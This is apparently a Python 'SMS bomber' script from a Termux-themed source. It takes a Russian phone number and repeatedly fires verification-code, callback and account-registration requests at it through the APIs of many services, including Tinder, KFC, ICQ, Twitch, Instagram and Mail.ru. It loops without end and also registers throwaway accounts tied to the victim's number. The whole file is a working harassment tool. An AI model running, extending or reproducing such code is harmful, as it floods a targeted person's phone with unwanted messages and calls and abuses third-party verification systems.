import requests, random, datetime, sys, time, argparse, os, colorama
os.system("clear")
banner = """\033[36m
╔═╗────╔═╗╔╗─────────
║═╣╔══╗║═╣║╚╗╔═╗─╔══╗
╠═║║║║║╠═║║║║║╬╚╗║║║║ \033[0m \033[31mTermux-Lab
╚═╝╚╩╩╝╚═╝╚╩╝╚══╝╚╩╩╝\033[0m \033[33m
Tg: @termuxlab
Vk: @termux_lab
"""
print(banner)
_phone = input('\033[36m(79xxxxxxxxx)>>\033[0m \033[35m ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
iteration = 0
print('\033[0m ')
print(' ')
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('\033[F[+] RuTaxi отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('\033[F[+] Tinder отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('\033[F[+] Karusel отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')
	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('\033[F[+] MTS отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[F[+] Youla отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print('\033[F[+] Citilink отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('\033[F[+] Sunlight отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('\033[F[+] Invitro отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print('\033[F[+] Karusel отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('\033[F[+] KFC отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('\033[F[+] ICQ отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print('\033[F[+] Invitro отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[F[+] findclone звонок отправлен!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('\033[F[+] Mail.ru отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('\033[F[+] OK отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('\033[F[+] Twitch отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[F[+] Youla отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field':''})
		print('\033[F[+] Insta отправлено!           ')
	except:
		print('\033[F[-] Не отправлено!')

	try:
		iteration += 1
	except:
		break
